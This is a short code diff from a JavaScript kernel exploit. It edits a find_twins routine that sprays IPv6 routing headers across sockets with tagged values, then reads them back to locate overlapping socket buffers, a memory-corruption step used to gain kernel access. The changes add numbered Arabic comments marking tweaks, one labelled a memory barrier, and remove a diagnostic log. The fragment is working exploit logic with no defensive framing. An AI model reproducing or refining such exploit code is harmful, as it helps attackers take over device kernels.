@@ -799,7 +799,6 @@ function find_twins() {
   twins[1] = -1;
   var spray_add = spray_rthdr.add(0x04);
   var leak_add = leak_rthdr.add(0x04);
-
   while (count < MAX_ROUNDS_TWIN) {
     if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
@@ -810,27 +809,20 @@ function find_twins() {
     } else {
       zeroMemoryCount = 0;
     }
-
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add);
+      read32(spray_add); // تعديل رقم 2 (memory barrier)
+
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-      write32(leak_add, 0);
+      write32(leak_add, 0); // تعديل رقم 4
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
       val = read32(leak_add);
       j = val & 0xFFFF;
-
-      // تشخيص: هل التاج بيتضرب أصلاً؟
-      if ((val & 0xFFFF0000) === RTHDR_TAG) {
-        log("HIT TAG: i=" + i + " j=" + j);
-      }
-
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
